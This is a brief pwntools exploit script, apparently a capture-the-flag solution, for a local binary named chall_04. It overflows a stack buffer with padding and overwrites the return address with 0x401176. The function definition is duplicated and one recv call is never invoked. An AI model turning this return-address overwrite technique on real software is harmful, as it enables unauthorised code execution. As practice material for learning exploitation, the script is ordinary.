# coding: utf-8
def fun():
    p=process("./chall_04")
    print(0x00401176)
    print(p.recv)
    payload = (b"a"*(0x60-8)+p64(0x00401176))
    p.sendline(payload)
    p.interactive()
    
    
from pwn import*
def fun():
    p=process("./chall_04")
    print(0x00401176)
    print(p.recv)
    payload = (b"a"*(0x60-8)+p64(0x00401176))
    p.sendline(payload)
    p.interactive()
    
    
fun()
